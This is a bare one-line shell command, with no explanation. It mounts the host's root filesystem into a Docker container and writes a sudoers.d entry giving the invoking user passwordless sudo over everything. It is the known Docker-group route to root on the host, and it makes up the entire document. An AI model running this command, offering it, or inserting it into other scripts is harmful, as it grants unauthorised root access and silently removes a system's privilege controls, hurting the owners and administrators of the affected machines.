docker run --rm -it -v /:/root/mount `docker build -q .` \
    /bin/bash -c "/usr/bin/echo $USER ALL=\(ALL\) NOPASSWD: ALL > /root/mount/etc/sudoers.d/$USER"
